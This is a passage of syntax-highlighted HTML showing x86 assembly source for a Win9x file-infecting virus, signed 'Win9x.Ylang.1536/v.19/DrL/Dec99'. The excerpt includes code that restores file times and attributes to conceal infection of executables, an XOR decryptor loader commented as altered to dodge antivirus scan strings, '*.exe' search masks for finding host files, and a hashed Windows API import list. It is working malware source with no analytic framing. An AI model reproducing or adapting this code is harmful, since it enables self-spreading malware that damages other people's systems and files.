        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">UnmapViewOfFile</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

 </span><span class="sc5">CloseMapHandle</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">MapHandle</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">CloseHandle</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">


 </span><span class="sc5">RestoreTime</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">LastWriteTime</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">LastAccessTime</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">Lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">CreationTime</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FileHandle</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SetFileTime</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

 </span><span class="sc5">ResizeFile</span><span class="sc4">:</span><span class="sc0">
        
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FileSize</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FileHandle</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0"> 

        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SetFilePointer</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">  
        
 </span><span class="sc5">MarkEndOfFile</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FileHandle</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SetEndOfFile</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0"> 
   

 </span><span class="sc5">CloseFile</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FileHandle</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">                 

        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">CloseHandle</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

 </span><span class="sc5">RestoreFileAttributs</span><span class="sc4">:</span><span class="sc0"> 

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FileAttributes</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">FileName</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SetFileAttributesA</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">ret</span><span class="sc0">


 </span><span class="sc5">BeginLoader</span><span class="sc4">:</span><span class="sc0">
 
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">VirLength0</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;prepare jump to virus</span><span class="sc0">

        </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">         </span><span class="sc1">;added to modify scan string</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,(</span><span class="sc5">VirLength</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">)/</span><span class="sc2">4</span><span class="sc0">

        

        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0beh</span><span class="sc0">              </span><span class="sc1">;mov esi,****</span><span class="sc0">

        </span><span class="sc5">LastSectionCode</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

 </span><span class="sc5">Crypt</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">lodsd</span><span class="sc0"> 
                
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">35h</span><span class="sc0">

        </span><span class="sc5">Key</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0aaaaaaa9h</span><span class="sc1">;0a1def07ch</span><span class="sc0">

        </span><span class="sc6">stosd</span><span class="sc0">

        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">Crypt</span><span class="sc0"> 

        </span><span class="sc6">ret</span><span class="sc0">                  </span><span class="sc1">;go to beginning of code</span><span class="sc0">

 </span><span class="sc5">EndLoader</span><span class="sc4">:</span><span class="sc0">






 </span><span class="sc5">Constants</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc5">MaxPath</span><span class="sc0">                 </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0">
        </span><span class="sc5">VirLength</span><span class="sc0">               </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">1536</span><span class="sc0">
        </span><span class="sc5">VirLength0</span><span class="sc0">              </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">EndVir0</span><span class="sc4">-</span><span class="sc5">BeginVir</span><span class="sc0">
        </span><span class="sc5">ApiNb</span><span class="sc0">                   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">14</span><span class="sc0">
        </span><span class="sc5">LoaderLength</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">EndLoader</span><span class="sc4">-</span><span class="sc5">BeginLoader</span><span class="sc0">

        </span><span class="sc5">OldEip</span><span class="sc0">                  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00401002h</span><span class="sc0"> 
        </span><span class="sc5">FindMatch</span><span class="sc0">               </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"*.exe"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0"> 
        </span><span class="sc5">FindMatch2</span><span class="sc0">              </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"*.*"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">DotDot</span><span class="sc0">                  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">".."</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">Signature</span><span class="sc0">               </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"Win9x.Ylang.1536/v.19/DrL/Dec99"</span><span class="sc0"> 

        </span><span class="sc5">ApiList</span><span class="sc0">                 </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0fdbe9ddfh</span><span class="sc0">  </span><span class="sc1">;CloseHandle</span><span class="sc0">
                                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">04b00fba1h</span><span class="sc0">  </span><span class="sc1">;CreateFileA</span><span class="sc0">
                                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00d6ea22eh</span><span class="sc0">  </span><span class="sc1">;CreateFileMappingA</span><span class="sc0">
                                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0be7b8631h</span><span class="sc0">  </span><span class="sc1">;FindClose</span><span class="sc0">
                                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0c915738fh</span><span class="sc0">  </span><span class="sc1">;FindFirstFileA</span><span class="sc0">
                                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">08851f43dh</span><span class="sc0">  </span><span class="sc1">;FindNextFileA</span><span class="sc0">
                                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">028f8c6fbh</span><span class="sc0">  </span><span class="sc1">;GetCurrentDirectoryA </span><span class="sc0">
                                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">032beddc3h</span><span class="sc0">  </span><span class="sc1">;MapViewOfFile</span><span class="sc0">
                                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">08e0e5487h</span><span class="sc0">  </span><span class="sc1">;SetCurrentDirectoryA</span><span class="sc0">
                                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0bc738ae6h</span><span class="sc0">  </span><span class="sc1">;SetEndOfFile</span><span class="sc0">
                                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">050665047h</span><span class="sc0">  </span><span class="sc1">;SetFileAttributesA </span><span class="sc0">
                                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">06d452a3ah</span><span class="sc0">  </span><span class="sc1">;SetFilePointer</span><span class="sc0">
                                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">09f69de76h</span><span class="sc0">  </span><span class="sc1">;SetFileTime</span><span class="sc0">
                                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0fae00d65h</span><span class="sc0">  </span><span class="sc1">;UnmapViewOfFile    </span><span class="sc0">
          

 </span><span class="sc5">EndVir</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc5">FileHandle</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">MapHandle</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">HostNewRawSize</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">MapAddress</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">NewEIP</span><span class="sc0">                  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">Counter</span><span class="sc0">                 </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">Crc</span><span class="sc0">                     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> 
        </span><span class="sc5">_Stack</span><span class="sc0">                  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">  
        </span><span class="sc5">Depth</span><span class="sc0">                   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> 


       </span><span class="sc1">;ApiAddress              </span><span class="sc0">
       </span><span class="sc5">CloseHandle</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc5">CreateFileA</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc5">CreateFileMappingA</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc5">FindClose</span><span class="sc0">                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc5">FindFirstFileA</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc5">FindNextFileA</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc5">GetCurrentDirectoryA</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc5">MapViewOfFile</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc5">SetCurrentDirectoryA</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc5">SetEndOfFile</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">  
       </span><span class="sc5">SetFileAttributesA</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc5">SetFilePointer</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc5">SetFileTime</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc5">UnmapViewOfFile</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

       </span><span class="sc5">FileAttributes</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">; attributes</span><span class="sc0">
       </span><span class="sc5">CreationTime</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">             </span><span class="sc1">; time of creation</span><span class="sc0">
       </span><span class="sc5">LastAccessTime</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">             </span><span class="sc1">; last access time</span><span class="sc0">
       </span><span class="sc5">LastWriteTime</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">             </span><span class="sc1">; last modificationm</span><span class="sc0">
       </span><span class="sc5">FileSizeHigh</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">; filesize</span><span class="sc0">
       </span><span class="sc5">FileSize</span><span class="sc0">                 </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc5">Reserved0</span><span class="sc0">                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc5">Reserved1</span><span class="sc0">                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc5">FileName</span><span class="sc0">                 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MaxPath</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc1">; long filename</span><span class="sc0">

       </span><span class="sc5">AlternateFileName</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">      </span><span class="sc1">; short filename</span><span class="sc0">
       </span><span class="sc5">DirExe</span><span class="sc0">                   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MaxPath</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0h</span><span class="sc4">)</span><span class="sc0">
       
 </span><span class="sc5">EndVir0</span><span class="sc4">:</span><span class="sc0">


 </span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">HOST</span></div></body>
</html>
